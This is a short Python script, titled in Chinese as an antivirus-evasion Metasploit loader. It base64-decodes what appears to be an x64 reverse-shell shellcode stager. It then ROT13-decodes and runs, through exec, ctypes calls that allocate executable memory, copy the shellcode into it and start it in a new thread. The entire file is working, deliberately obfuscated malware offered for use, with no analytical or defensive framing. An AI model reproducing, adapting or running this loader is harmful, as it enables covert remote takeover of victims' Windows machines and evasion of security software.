# -*- coding: utf-8 -*-
# @Time    : 16 2月 2025 9:00 下午
# @Author  : codervibe
# @File    : msf免杀加密混淆.py
# @Project : pythonBasics
# -*- coding: utf-8 -*-
# @Time    : 16 2月 2025 8:00 下午
# @Author  : codervibe
# @File    : msf加密免杀.py
# @Project : pythonBasics
import ctypes
import base64
a = '/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAMx5RTaFA0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V'
shellcode = base64.b64decode(a)
def c(d):
    e = ''
    for f in d:
        if (ord(f) >= ord('A') and ord(f) <= ord('M')) or (ord(f) >= ord('a') and ord(f) <= ord('m')):
            e += chr(ord(f) + 13)
        elif (ord(f) >= ord('N') and ord(f) <= ord('Z')) or (ord(f) >= ord('n') and ord(f) <= ord('z')):
            e += chr(ord(f) - 13)
        else:
            e += f
    return e

g = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
exec(c(g))
